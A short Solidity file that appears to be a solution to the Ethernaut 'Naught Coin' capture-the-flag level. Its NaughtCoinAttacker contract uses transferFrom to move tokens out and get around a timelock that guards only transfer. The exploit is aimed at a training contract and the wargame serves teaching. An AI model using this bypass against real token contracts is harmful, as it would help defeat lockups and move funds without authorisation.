// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import { Ownable2Step } from "@openzeppelin-contracts/access/Ownable2Step.sol";
import { INaughtCoin } from "ethernaut/15-naught-coin/INaughtCoin.sol";

contract NaughtCoinAttacker is Ownable2Step {
    function exploit(address _naughtCoin, uint256 _amount) external onlyOwner returns (bool) {
        return INaughtCoin(_naughtCoin).transferFrom(msg.sender, address(this), _amount);
    }
}
